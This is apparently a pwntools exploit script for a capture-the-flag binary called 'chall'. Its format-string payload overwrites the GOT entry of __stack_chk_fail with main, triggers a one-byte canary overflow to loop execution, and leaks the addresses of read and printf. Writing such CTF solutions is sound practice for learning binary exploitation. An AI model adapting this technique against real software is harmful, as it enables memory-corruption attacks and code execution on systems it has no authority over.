#!/usr/bin/python3
from pwn import *

elf = ELF("chall")
context.binary = elf

HOST = ""
PORT = 6969

gs = """
b *main
continue
"""

# context.log_level = "debug"


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)


def main():
    global io
    io = start()

    payload_len = 4*16+8+1
    # 6-9
    payload = f"%{(elf.sym.main) & 0xffff}c%10$hn|%11$s|%12$s|".encode()
    payload = payload.ljust(0x20, b"A")
    payload += p64(elf.got.__stack_chk_fail)  # 10
    payload += p64(elf.got.read)  # 11
    payload += p64(elf.got.printf)  # 12
    # We will overwrite __stack_chk_fail with main,
    # 1 byte overflow to change stack canary,
    # which will call __stack_chk_fail.
    payload = payload.ljust(payload_len, b"A")
    print(len(payload), payload)

    io.sendlineafter(b"? ", payload)

    # leaks = io.clean(2).split(b"|")
    # print(leaks)
    # read, printf = u64(leaks[1].ljust(8, b"\x00")), u64(
    #     leaks[2].ljust(8, b"\x00"))
    # log.info(f"read: {hex(read)}")
    # log.info(f"printf: {hex(printf)}")

    # io.sendlineafter(b"? ", b"NeoZap")

    io.interactive()


if __name__ == "__main__":
    main()
